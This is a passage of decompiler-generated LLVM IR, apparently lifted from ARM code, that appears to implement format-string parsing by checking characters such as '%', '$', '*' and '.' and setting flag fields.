  store i32 %v1_14058, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_1405c.preheader, %dec_label_pc_14058
  %v0_140e0 = phi i32 [ %v0_14060.pre, %dec_label_pc_1405c.preheader ], [ %v1_14058, %dec_label_pc_14058 ]
  store i32 684, i32* %r2.global-to-local, align 4
  %v1_14060 = inttoptr i32 %v0_140e0 to i8*
  %v2_14060 = load i8, i8* %v1_14060, align 1
  %v3_14060 = zext i8 %v2_14060 to i32
  store i32 %v3_14060, i32* @ip, align 4
  %v4_14064 = load i32, i32* %v3_14064, align 4
  store i32 %v4_14064, i32* %r3.global-to-local, align 4
  %v2_14068 = mul nuw nsw i32 %v3_14060, 2
  store i32 %v2_14068, i32* %r2.global-to-local, align 4
  %v2_1406c = add i32 %v2_14068, %v4_14064
  %v3_1406c = inttoptr i32 %v2_1406c to i16*
  %v4_1406c = load i16, i16* %v3_1406c, align 2
  %v6_1406c = zext i16 %v4_1406c to i32
  store i32 %v6_1406c, i32* %r3.global-to-local, align 4
  %v1_14070 = and i32 %v6_1406c, 8
  %v2_14070 = icmp eq i32 %v1_14070, 0
  br i1 %v2_14070, label %dec_label_pc_14078, label %dec_label_pc_14020

dec_label_pc_14078:                               ; preds = %dec_label_pc_1405c
  %v0_14078 = load i32, i32* %r0.global-to-local, align 4
  %v1_14078 = add i32 %v0_14078, -1
  %v2_14078 = inttoptr i32 %v1_14078 to i8*
  %v3_14078 = load i8, i8* %v2_14078, align 1
  %v4_14078 = zext i8 %v3_14078 to i32
  store i32 %v4_14078, i32* %r3.global-to-local, align 4
  %v7_1407c = icmp eq i8 %v3_14078, 37
  br i1 %v7_1407c, label %dec_label_pc_14084, label %dec_label_pc_14144

dec_label_pc_14084:                               ; preds = %dec_label_pc_14078
  %v7_14084 = icmp eq i8 %v2_14060, 36
  %. = zext i1 %v7_14084 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_14090 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_14090, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_14084
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14084, %bb144
  %v0_14098 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_14084 ]
  %v2_14098 = icmp eq i32 %v0_14098, 0
  %v0_140cc = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_14098, label %dec_label_pc_140cc, label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %thread-pre-split
  %v2_140cc = icmp eq i32 %v0_140cc, 0
  %v1_140a4 = add i32 %v0_140e0, 1
  store i32 %v1_140a4, i32* %r0.global-to-local, align 4
  br i1 %v2_140cc, label %dec_label_pc_14478, label %dec_label_pc_140ac

dec_label_pc_140ac:                               ; preds = %dec_label_pc_140a0
  %v2_140ac = sub i32 %v0_14090, %v0_140cc
  %v4_140ac = xor i32 %v0_140cc, %v0_14090
  %v5_140ac = xor i32 %v2_140ac, %v0_14090
  %v6_140ac = and i32 %v5_140ac, %v4_140ac
  %v7_140ac = icmp slt i32 %v6_140ac, 0
  %v8_140ac = icmp slt i32 %v2_140ac, 0
  %v9_140ac = icmp eq i32 %v0_14090, %v0_140cc
  %v3_140b0 = xor i1 %v8_140ac, %v7_140ac
  %v4_140b0 = or i1 %v9_140ac, %v3_140b0
  br i1 %v4_140b0, label %dec_label_pc_140c0, label %bb145

bb145:                                            ; preds = %dec_label_pc_140ac
  store i32 %v0_14090, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140bc:                               ; preds = %dec_label_pc_140e0, %dec_label_pc_140e8
  %v0_140bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_140bc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %bb145, %dec_label_pc_140ac, %dec_label_pc_140bc
  %v0_140c0 = phi i32 [ %v0_14078, %dec_label_pc_140bc ], [ %v1_140a4, %dec_label_pc_140ac ], [ %v1_140a4, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_140bc ], [ %v0_14090, %dec_label_pc_140ac ], [ %v0_14090, %bb145 ]
  store i32 %v0_140c0, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_140fc.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_140fc = ptrtoint i8* %v2_140fc.pre to i32
  br label %dec_label_pc_140fc

dec_label_pc_140cc:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_140cc, 1
  br i1 %tmp146, label %dec_label_pc_140e0, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140cc
  %v7_140d4 = icmp eq i8 %v2_14060, 109
  br i1 %v7_140d4, label %dec_label_pc_14144, label %dec_label_pc_14478

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140cc
  %tmp183 = icmp ugt i32 %v0_140e0, %v0_14078
  br i1 %tmp183, label %dec_label_pc_140e8, label %dec_label_pc_140bc

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140e0
  %v1_140e8 = inttoptr i32 %v0_14078 to i8*
  %v2_140e8 = load i8, i8* %v1_140e8, align 1
  %v3_140e8 = zext i8 %v2_140e8 to i32
  store i32 %v3_140e8, i32* %r3.global-to-local, align 4
  %v7_140ec = icmp eq i8 %v2_140e8, 48
  br i1 %v7_140ec, label %dec_label_pc_140bc, label %bb147

bb147:                                            ; preds = %dec_label_pc_140e8
  %v1_140f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_140f0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14144

dec_label_pc_140fc.loopexit:                      ; preds = %dec_label_pc_14104
  %v1_14110 = load i32, i32* @r4, align 4
  %v3_14110 = or i32 %v1_14110, %v0_14124
  store i32 %v3_14110, i32* @r4, align 4
  %v2_14114 = add i32 %v0_1410876, 1
  store i32 %v2_14114, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140fc.loopexit, %dec_label_pc_140c0
  %v0_1410876 = phi i32 [ %v2_14114, %dec_label_pc_140fc.loopexit ], [ %v0_140c0, %dec_label_pc_140c0 ]
  store i32 %v3_140fc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14108 = inttoptr i32 %v0_1410876 to i8*
  br label %dec_label_pc_14104

dec_label_pc_14104:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_140fc
  %v0_14124 = phi i32 [ %v2_14124, %dec_label_pc_1411c ], [ 1, %dec_label_pc_140fc ]
  %v0_14104 = phi i32 [ %v5_14104, %dec_label_pc_1411c ], [ %v3_140fc, %dec_label_pc_140fc ]
  %v1_14104 = inttoptr i32 %v0_14104 to i8*
  %v2_14104 = load i8, i8* %v1_14104, align 1
  %v3_14104 = zext i8 %v2_14104 to i32
  store i32 %v3_14104, i32* %r2.global-to-local, align 4
  %v5_14104 = add i32 %v0_14104, 1
  store i32 %v5_14104, i32* %r0.global-to-local, align 4
  %v2_14108 = load i8, i8* %v1_14108, align 1
  %v3_14108 = zext i8 %v2_14108 to i32
  store i32 %v3_14108, i32* %r3.global-to-local, align 4
  %v9_1410c = icmp eq i8 %v2_14108, %v2_14104
  br i1 %v9_1410c, label %dec_label_pc_140fc.loopexit, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_14104
  %v1_1411c = inttoptr i32 %v5_14104 to i8*
  %v2_1411c = load i8, i8* %v1_1411c, align 1
  %v3_1411c = zext i8 %v2_1411c to i32
  store i32 %v3_1411c, i32* %r3.global-to-local, align 4
  %v2_14120 = icmp eq i8 %v2_1411c, 0
  %v2_14124 = mul i32 %v0_14124, 2
  store i32 %v2_14124, i32* %r1.global-to-local, align 4
  br i1 %v2_14120, label %dec_label_pc_1412c, label %dec_label_pc_14104

dec_label_pc_1412c:                               ; preds = %dec_label_pc_1411c
  %v1_1412c = add i32 %v0_1410876, -1
  %v2_1412c = inttoptr i32 %v1_1412c to i8*
  %v3_1412c = load i8, i8* %v2_1412c, align 1
  %v7_14130 = icmp eq i8 %v3_1412c, 37
  %v0_14134 = load i32, i32* @r4, align 4
  %v1_14134 = and i32 %v0_14134, 10
  store i32 %v1_14134, i32* %r3.global-to-local, align 4
  %v4_14138 = udiv i32 %v1_14134, 2
  %v5_14138 = sub nuw nsw i32 -1, %v4_14138
  %v6_14138 = and i32 %v0_14134, %v5_14138
  store i32 %v6_14138, i32* @r4, align 4
  br i1 %v7_14130, label %dec_label_pc_14140, label %dec_label_pc_13ff8

dec_label_pc_14140:                               ; preds = %dec_label_pc_1412c
  %v0_14140 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14140, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %bb147, %dec_label_pc_14078, %dec_label_pc_140d4, %dec_label_pc_14140
  %v1_14184 = phi i32 [ %v0_1410876, %dec_label_pc_14140 ], [ %v0_140e0, %bb147 ], [ %v0_140e0, %dec_label_pc_140d4 ], [ %v0_140e0, %dec_label_pc_14078 ]
  %v0_14180 = phi i32 [ %v5_14104, %dec_label_pc_14140 ], [ %v0_14078, %bb147 ], [ %v0_14078, %dec_label_pc_140d4 ], [ %v0_14078, %dec_label_pc_14078 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_14140 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_140d4 ], [ %stack_var_-44.1, %dec_label_pc_14078 ]
  %v1_14144 = inttoptr i32 %v0_14180 to i8*
  %v2_14144 = load i8, i8* %v1_14144, align 1
  %v3_14144 = zext i8 %v2_14144 to i32
  store i32 %v3_14144, i32* %r3.global-to-local, align 4
  %v7_14148 = icmp eq i8 %v2_14144, 42
  br i1 %v7_14148, label %dec_label_pc_14150, label %dec_label_pc_14190

dec_label_pc_14150:                               ; preds = %dec_label_pc_14144
  %v0_14150 = load i32, i32* %fp.global-to-local, align 4
  %v2_14150 = icmp eq i32 %v0_14150, 0
  br i1 %v2_14150, label %dec_label_pc_14180, label %dec_label_pc_14158

dec_label_pc_14158:                               ; preds = %dec_label_pc_14150
  %v1_14158 = inttoptr i32 %v1_14184 to i8*
  %v2_14158 = load i8, i8* %v1_14158, align 1
  %v3_14158 = zext i8 %v2_14158 to i32
  store i32 %v3_14158, i32* %r3.global-to-local, align 4
  %v7_1415c = icmp eq i8 %v2_14158, 36
  br i1 %v7_1415c, label %dec_label_pc_14164, label %dec_label_pc_14478

dec_label_pc_14164:                               ; preds = %dec_label_pc_14158
  %v0_14164 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_14164, 1
  br i1 %tmp148, label %dec_label_pc_14478, label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %dec_label_pc_14164
  %v0_14170 = load i32, i32* %r8.global-to-local, align 4
  %v1_14170 = load i32, i32* %sb.global-to-local, align 4
  %v3_14170 = mul i32 %v1_14170, %v0_14170
  %v4_14170 = add i32 %v3_14170, %v3_14004.pre-phi
  store i32 %v4_14170, i32* %r3.global-to-local, align 4
  %v1_14174 = add i32 %v1_14184, 1
  store i32 %v1_14174, i32* %r6.global-to-local, align 4
  %v2_14178 = add i32 %v4_14170, -12
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  store i32 %v0_14164, i32* %v3_14178, align 4
  br label %dec_label_pc_1418c

dec_label_pc_14180:                               ; preds = %dec_label_pc_14150
  %v1_14180 = add i32 %v0_14180, 1
  store i32 %v1_14180, i32* %r3.global-to-local, align 4
  %v9_14184 = icmp eq i32 %v1_14180, %v1_14184
  br i1 %v9_14184, label %dec_label_pc_1418c, label %dec_label_pc_14478

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14180, %dec_label_pc_1416c
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14144, %dec_label_pc_1418c
  %v0_14190 = load i32, i32* %r8.global-to-local, align 4
  %v2_14190 = icmp eq i32 %v0_14190, 0
  br i1 %v2_14190, label %dec_label_pc_1419c, label %dec_label_pc_141bc.loopexit

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14190
  %v0_1419c = load i32, i32* %r6.global-to-local, align 4
  %v1_1419c = inttoptr i32 %v0_1419c to i8*
  %v2_1419c = load i8, i8* %v1_1419c, align 1
  %v3_1419c = zext i8 %v2_1419c to i32
  store i32 %v3_1419c, i32* %r3.global-to-local, align 4
  %v7_141a0 = icmp eq i8 %v2_1419c, 46
  br i1 %v7_141a0, label %.thread20, label %dec_label_pc_141b4

.thread20:                                        ; preds = %dec_label_pc_1419c
  %v2_141a4 = add i32 %v0_1419c, 1
  store i32 %v2_141a4, i32* %r6.global-to-local, align 4
  %v1_141a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_141a8, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13ff8

dec_label_pc_141b4:                               ; preds = %dec_label_pc_1419c
  %v0_141b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_141b4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_141bc

dec_label_pc_141bc.loopexit:                      ; preds = %dec_label_pc_14190
  %v1_14194 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_14194, i32* @r5, align 4
  %v0_141c8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %dec_label_pc_141bc.loopexit, %dec_label_pc_141b4
  %v0_141c8.pre = phi i32 [ %v0_141c8.pre.pre, %dec_label_pc_141bc.loopexit ], [ %v0_1419c, %dec_label_pc_141b4 ]
  store i32 -37040, i32* %r3.global-to-local, align 4
  %v0_141c0 = load i32, i32* @lr, align 4
  %v2_141c0 = add i32 %v0_141c0, -37040
  store i32 %v2_141c0, i32* %r1.global-to-local, align 4
  %v1_141c8 = inttoptr i32 %v0_141c8.pre to i8*
  br label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141d8, %dec_label_pc_141bc
  %v0_141d8 = phi i32 [ %v1_141d8, %dec_label_pc_141d8 ], [ %v2_141c0, %dec_label_pc_141bc ]
  %v1_141c4 = inttoptr i32 %v0_141d8 to i8*
  %v2_141c4 = load i8, i8* %v1_141c4, align 1
  %v3_141c4 = zext i8 %v2_141c4 to i32
  store i32 %v3_141c4, i32* %r2.global-to-local, align 4
  %v2_141c8 = load i8, i8* %v1_141c8, align 1
  %v3_141c8 = zext i8 %v2_141c8 to i32
  store i32 %v3_141c8, i32* %r3.global-to-local, align 4
  %v9_141cc = icmp eq i8 %v2_141c8, %v2_141c4
  br i1 %v9_141cc, label %bb149, label %dec_label_pc_141d8

bb149:                                            ; preds = %dec_label_pc_141c4
  %v2_141d0 = add i32 %v0_141c8.pre, 1
  store i32 %v2_141d0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_141e4

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141c4
  %v1_141d8 = add i32 %v0_141d8, 1
  %v2_141d8 = inttoptr i32 %v1_141d8 to i8*
  %v3_141d8 = load i8, i8* %v2_141d8, align 1
  %v4_141d8 = zext i8 %v3_141d8 to i32
  store i32 %v4_141d8, i32* %r3.global-to-local, align 4
  store i32 %v1_141d8, i32* %r1.global-to-local, align 4
  %v2_141dc = icmp eq i8 %v3_141d8, 0
  br i1 %v2_141dc, label %dec_label_pc_141e4, label %dec_label_pc_141c4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141d8, %bb149
  %v1_14208 = phi i32 [ %v2_141d0, %bb149 ], [ %v0_141c8.pre, %dec_label_pc_141d8 ]
  %v1_14204 = phi i32 [ %v0_141d8, %bb149 ], [ %v1_141d8, %dec_label_pc_141d8 ]
  %v2_141ec = sub i32 %v1_14204, %v2_141c0
  store i32 %v2_141ec, i32* %r3.global-to-local, align 4
  %v8_141f4 = icmp sgt i32 %v2_141ec, 1
  br i1 %v8_141f4, label %.thread24, label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141e4
  %v1_141f8 = inttoptr i32 %v1_14208 to i8*
  %v2_141f8 = load i8, i8* %v1_141f8, align 1
  %v3_141f8 = zext i8 %v2_141f8 to i32
  store i32 %v3_141f8, i32* %r2.global-to-local, align 4
  %v1_141fc = inttoptr i32 %v1_14204 to i8*
  %v2_141fc = load i8, i8* %v1_141fc, align 1
  %v3_141fc = zext i8 %v2_141fc to i32
  store i32 %v3_141fc, i32* %r3.global-to-local, align 4
  %v9_14200 = icmp eq i8 %v2_141f8, %v2_141fc
  br i1 %v9_14200, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_141f8
  %v2_14204 = add i32 %v1_14204, 9
  store i32 %v2_14204, i32* %r1.global-to-local, align 4
  %v2_14208 = add i32 %v1_14208, 1
  store i32 %v2_14208, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_141f8, %dec_label_pc_141e4, %bb150
  %v0_14210 = phi i32 [ %v1_14204, %dec_label_pc_141f8 ], [ %v1_14204, %dec_label_pc_141e4 ], [ %v2_14204, %bb150 ]
  %v0_1420c = phi i32 [ %v1_14208, %dec_label_pc_141f8 ], [ %v1_14208, %dec_label_pc_141e4 ], [ %v2_14208, %bb150 ]
  %v1_1420c = inttoptr i32 %v0_1420c to i8*
  %v2_1420c = load i8, i8* %v1_1420c, align 1
  %v3_1420c = zext i8 %v2_1420c to i32
  store i32 %v3_1420c, i32* %r2.global-to-local, align 4
  %v1_14210 = add i32 %v0_14210, 9
  %v2_14210 = inttoptr i32 %v1_14210 to i8*
  %v3_14210 = load i8, i8* %v2_14210, align 1
  %v4_14210 = zext i8 %v3_14210 to i32
  store i32 %v4_14210, i32* %r3.global-to-local, align 4
  %v2_14214 = icmp eq i8 %v2_1420c, 0
  %v3_14218 = mul nuw nsw i32 %v4_14210, 256
  store i32 %v3_14218, i32* @ip, align 4
  br i1 %v2_14214, label %dec_label_pc_14478, label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %.thread24
  store i32 -36940, i32* %r3.global-to-local, align 4
  %v2_14224 = add i32 %v0_141c0, -36940
  store i32 %v2_14224, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_142ac, %dec_label_pc_14220
  %v1_1423c = phi i32 [ %v1_142ac, %dec_label_pc_142ac ], [ %v2_14224, %dec_label_pc_14220 ]
  %v1_14228 = inttoptr i32 %v1_1423c to i8*
  %v2_14228 = load i8, i8* %v1_14228, align 1
  %v3_14228 = zext i8 %v2_14228 to i32
  store i32 %v3_14228, i32* %r3.global-to-local, align 4
  %v9_1422c = icmp eq i8 %v2_14228, %v2_1420c
  br i1 %v9_1422c, label %dec_label_pc_14234, label %dec_label_pc_142ac

dec_label_pc_14234:                               ; preds = %dec_label_pc_14228
  store i32 %v2_14224, i32* %r3.global-to-local, align 4
  %v2_1423c = sub i32 %v1_1423c, %v2_14224
  store i32 %v2_1423c, i32* %r1.global-to-local, align 4
  %v7_14244 = icmp slt i32 %v2_1423c, 18
  br i1 %v7_14244, label %bb152, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_14234
  %v1_14248 = and i32 %v3_14218, 1024
  %v2_14248 = icmp eq i32 %v1_14248, 0
  br i1 %v2_14248, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_14248
  %v2_1424c = add i32 %v2_1423c, -2
  store i32 %v2_1424c, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_14234, %dec_label_pc_14248, %bb151
  %v0_14254 = phi i32 [ %v2_1423c, %dec_label_pc_14234 ], [ %v2_1423c, %dec_label_pc_14248 ], [ %v2_1424c, %bb151 ]
  store i32 -36988, i32* %r3.global-to-local, align 4
  %v1_14254 = load i32, i32* %r7.global-to-local, align 4
  %v2_14254 = add i32 %v1_14254, 32
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  store i32 %v0_14254, i32* %v3_14254, align 4
  %v0_14258 = load i32, i32* @lr, align 4
  %v1_14258 = load i32, i32* %r3.global-to-local, align 4
  %v2_14258 = add i32 %v1_14258, %v0_14258
  store i32 %v2_14258, i32* %r3.global-to-local, align 4
  %v1_1425c = add i32 %v2_14258, -1
  store i32 %v1_1425c, i32* %r0.global-to-local, align 4
  %v0_14264.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14260

dec_label_pc_14260:                               ; preds = %dec_label_pc_14260, %bb152
  %v0_14260 = phi i32 [ %v1_14260, %dec_label_pc_14260 ], [ %v1_1425c, %bb152 ]
  %v1_14260 = add i32 %v0_14260, 1
  %v2_14260 = inttoptr i32 %v1_14260 to i8*
  %v3_14260 = load i8, i8* %v2_14260, align 1
  %v4_14260 = zext i8 %v3_14260 to i32
  store i32 %v4_14260, i32* %r3.global-to-local, align 4
  store i32 %v1_14260, i32* %r0.global-to-local, align 4
  %v8_14268 = icmp sgt i32 %v0_14264.pre, %v4_14260
  br i1 %v8_14268, label %dec_label_pc_14260, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14260
  %v2_14274.neg = sub i32 36988, %v0_14258
  %v2_14278 = add i32 %v2_14274.neg, %v1_14260
  %v2_1427c = mul i32 %v2_14278, 2
  store i32 %v2_1427c, i32* %r2.global-to-local, align 4
  %v2_14280 = add i32 %v0_14258, -37004
  store i32 %v2_14280, i32* %r3.global-to-local, align 4
  %v2_14284 = add i32 %v2_1427c, %v2_14280
  %v3_14284 = inttoptr i32 %v2_14284 to i16*
  %v4_14284 = load i16, i16* %v3_14284, align 2
  %v6_14284 = sext i16 %v4_14284 to i32
  store i32 %v6_14284, i32* %r1.global-to-local, align 4
  %v2_1428c = add i32 %v0_14258, -37020
  store i32 %v2_1428c, i32* %r3.global-to-local, align 4
  %v2_14290 = add i32 %v2_1427c, %v2_1428c
  %v3_14290 = inttoptr i32 %v2_14290 to i16*
  %v4_14290 = load i16, i16* %v3_14290, align 2
  %v6_14290 = sext i16 %v4_14290 to i32
  %v1_14294 = load i32, i32* @ip, align 4
  %v2_14294 = or i32 %v1_14294, %v6_14284
  %v2_14298 = and i32 %v2_14294, %v6_14290
  store i32 %v2_14298, i32* %r1.global-to-local, align 4
  store i32 -36940, i32* %r3.global-to-local, align 4
  %v2_142a0 = add i32 %v0_14258, -36940
  store i32 %v2_142a0, i32* %r0.global-to-local, align 4
  store i32 %v2_14298, i32* %stack_var_-72, align 4
  %v0_142c4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_142b8

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14228
  %v1_142ac = add i32 %v1_1423c, 1
  %v2_142ac = inttoptr i32 %v1_142ac to i8*
  %v3_142ac = load i8, i8* %v2_142ac, align 1
  %v4_142ac = zext i8 %v3_142ac to i32
  store i32 %v4_142ac, i32* %r3.global-to-local, align 4
  store i32 %v1_142ac, i32* %r0.global-to-local, align 4
  %v2_142b0 = icmp eq i8 %v3_142ac, 0
  br i1 %v2_142b0, label %dec_label_pc_142b8, label %dec_label_pc_14228

dec_label_pc_142b8:                               ; preds = %dec_label_pc_142ac, %dec_label_pc_1426c
  %v0_142c4 = phi i32 [ %v0_142c4.pre, %dec_label_pc_1426c ], [ %v0_1420c, %dec_label_pc_142ac ]
  %v0_142c0 = phi i32 [ %v1_14294, %dec_label_pc_1426c ], [ %v3_14218, %dec_label_pc_142ac ]
  %v0_142b8 = load i32, i32* @r4, align 4
  %v1_142b8 = and i32 %v0_142b8, 4
  %v1_142bc = and i32 %v0_142b8, -5
  store i32 %v1_142bc, i32* %r3.global-to-local, align 4
  %v1_142c0 = and i32 %v0_142c0, 3840
  store i32 %v1_142c0, i32* %r2.global-to-local, align 4
  %v1_142c4 = inttoptr i32 %v0_142c4 to i8*
  %v2_142c4 = load i8, i8* %v1_142c4, align 1
  %v3_142c4 = zext i8 %v2_142c4 to i32
  store i32 %v3_142c4, i32* %r1.global-to-local, align 4
  %v2_142c8 = or i32 %v1_142bc, %v1_142c0
  store i32 %v2_142c8, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_142b8, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_142d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_142d4 = add i32 %v1_142d4, 20
  %v3_142d4 = inttoptr i32 %v2_142d4 to i32*
  store i32 %tmp181, i32* %v3_142d4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_142dc = load i32, i32* %r1.global-to-local, align 4
  %v1_142dc = load i32, i32* %r7.global-to-local, align 4
  %v2_142dc = add i32 %v1_142dc, 12
  %v3_142dc = inttoptr i32 %v2_142dc to i32*
  store i32 %v0_142dc, i32* %v3_142dc, align 4
  %v0_142e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_142e0 = add i32 %v0_142e0, 4
  %v2_142e0 = inttoptr i32 %v1_142e0 to i32*
  %v3_142e0 = load i32, i32* @r5, align 4
  store i32 %v3_142e0, i32* %v2_142e0, align 4
  %v4_142e0 = add i32 %v0_142e0, 8
  %v5_142e0 = inttoptr i32 %v4_142e0 to i32*
  %v6_142e0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_142e0, i32* %v5_142e0, align 4
  %v0_142e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_142e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_142e4 = add i32 %v1_142e4, 16
  %v3_142e4 = inttoptr i32 %v2_142e4 to i32*
  store i32 %v0_142e4, i32* %v3_142e4, align 4
  %v0_142e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_142e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_142e8 = add i32 %v1_142e8, 28
  %v3_142e8 = inttoptr i32 %v2_142e8 to i32*
  store i32 %v0_142e8, i32* %v3_142e8, align 4
  %v0_142ec = load i32, i32* %r0.global-to-local, align 4
  %v1_142ec = inttoptr i32 %v0_142ec to i8*
  %v2_142ec = load i8, i8* %v1_142ec, align 1
  %v3_142ec = zext i8 %v2_142ec to i32
  store i32 %v3_142ec, i32* %r2.global-to-local, align 4
  %v2_142f0 = icmp eq i8 %v2_142ec, 0
  br i1 %v2_142f0, label %dec_label_pc_142f8, label %dec_label_pc_1437c

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142b8
  %v0_142f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_142f8 = inttoptr i32 %v0_142f8 to i8*
  %v2_142f8 = load i8, i8* %v1_142f8, align 1
  %v3_142f8 = zext i8 %v2_142f8 to i32
  store i32 %v3_142f8, i32* %r3.global-to-local, align 4
  %v7_142fc = icmp eq i8 %v2_142f8, 109
  br i1 %v7_142fc, label %.thread28, label %dec_label_pc_14310

.thread28:                                        ; preds = %dec_label_pc_142f8
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_14304 = load i32, i32* %r7.global-to-local, align 4
  %v3_14304 = add i32 %v2_14304, 32
  %v4_14304 = inttoptr i32 %v3_14304 to i32*
  store i32 20, i32* %v4_14304, align 4
  %v1_14308 = load i32, i32* %r2.global-to-local, align 4
  %v2_14308 = load i32, i32* %r7.global-to-local, align 4
  %v3_14308 = add i32 %v2_14308, 28
  %v4_14308 = inttoptr i32 %v3_14308 to i32*
  store i32 %v1_14308, i32* %v4_14308, align 4
  br label %dec_label_pc_1437c

dec_label_pc_14310:                               ; preds = %dec_label_pc_142f8
  store i32 1012, i32* %r3.global-to-local, align 4
  %v0_14314 = load i32, i32* @lr, align 4
  %v2_14314 = add i32 %v0_14314, 1012
  %v3_14314 = inttoptr i32 %v2_14314 to i32*
  %v4_14314 = load i32, i32* %v3_14314, align 4
  store i32 %v4_14314, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_1431c = load i32, i32* %r7.global-to-local, align 4
  %v2_1431c = add i32 %v1_1431c, 32
  %v3_1431c = inttoptr i32 %v2_1431c to i32*
  store i32 21, i32* %v3_1431c, align 4
  %v0_14320 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14320, i32* @ip, align 4
  %v1_14324 = add i32 %v0_14320, 10
  store i32 %v1_14324, i32* %r0.global-to-local, align 4
  %v0_1432c.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_1432c = inttoptr i32 %v0_1432c.pre to i8*
  br label %dec_label_pc_14328

dec_label_pc_14328:                               ; preds = %dec_label_pc_1436c, %dec_label_pc_14310
  %v1_14338 = phi i32 [ %v1_1436c, %dec_label_pc_1436c ], [ %v0_14320, %dec_label_pc_14310 ]
  %v1_14328 = inttoptr i32 %v1_14338 to i8*
  %v2_14328 = load i8, i8* %v1_14328, align 1
  %v3_14328 = zext i8 %v2_14328 to i32
  store i32 %v3_14328, i32* %r2.global-to-local, align 4
  %v2_1432c = load i8, i8* %v1_1432c, align 1
  %v3_1432c = zext i8 %v2_1432c to i32
  store i32 %v3_1432c, i32* %r3.global-to-local, align 4
  %v9_14330 = icmp eq i8 %v2_14328, %v2_1432c
  br i1 %v9_14330, label %dec_label_pc_14338, label %dec_label_pc_1436c

dec_label_pc_14338:                               ; preds = %dec_label_pc_14328
  %v2_14338 = sub i32 %v1_14338, %v0_14320
  store i32 %v2_14338, i32* %r3.global-to-local, align 4
